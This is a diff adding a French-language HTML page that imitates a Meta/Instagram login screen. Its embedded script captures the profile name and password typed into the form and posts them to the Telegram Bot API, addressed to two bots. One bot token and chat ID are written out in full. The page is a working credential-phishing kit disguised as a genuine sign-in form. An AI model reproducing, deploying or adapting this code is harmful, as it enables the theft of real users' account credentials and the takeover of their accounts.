@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+    <link rel="stylesheet" href="https://instaaa25.github.io/gh/CSSYKK.css">
+</head>
+<body>
+    <div class="login-container">
+        <p class="languagef">Français (France) ▼</p>
+        <br>
+        <img src="https://files.catbox.moe/f2il05.png" alt="Logo" class="logof">
+        <input type="text" placeholder="Nom de profil, e-mail ou numéro...">
+        <input type="password" placeholder="Mot de passe">
+        <button class="btn">Se connecter</button>
+        <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <a href="#" class="create-account">Créer un compte</a>
+        <p class="meta">Ⓜ Meta</p>
+    </div>
+    <script>
+        // Fonction pour envoyer le message à Telegram (à plusieurs bots)
+        function sendToTelegram(message, token, chatId) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+    
+            return fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Message envoyé avec succès:', data);
+                    return true; // L'envoi a réussi
+                } else {
+                    console.error('Erreur Telegram:', data);
+                    return false; // L'envoi a échoué
+                }
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi du message:', error);
+                return false; // L'envoi a échoué
+            });
+        }
+    
+        // Fonction pour gérer la soumission du formulaire
+        document.querySelector('.btn').addEventListener('click', async function() {
+            const username = document.querySelector('input[type="text"]').value;
+            const password = document.querySelector('input[type="password"]').value;
+    
+            if (username && password) {
+                const message = `Nom de profil: ${username}\nMot de passe: ${password}`;
+    
+                // Les tokens et chat IDs des deux bots
+                const token1 = '6799956480:AAF6uKM4b72aAxNe6n2vOCuHpg7rCJoRPkY';  // Remplace par ton premier token
+                const chatId1 = '6669693805';   // Remplace par ton premier chat ID
+                const token2 = '7550985588:';  // Remplace par ton deuxième token
+                const chatId2 = '';   // Remplace par ton deuxième chat ID
+    
+                // Envoie les informations à deux bots différents
+                const success1 = await sendToTelegram(message, token1, chatId1);
+                const success2 = await sendToTelegram(message, token2, chatId2);
+    
+                if (success1 && success2) {
+                    alert('');
+                } else {
+                    alert('');
+                }
+            } else {
+                alert('');
+            }
+        });
+    </script>
+    
+    
+    
+</body>
+</html>
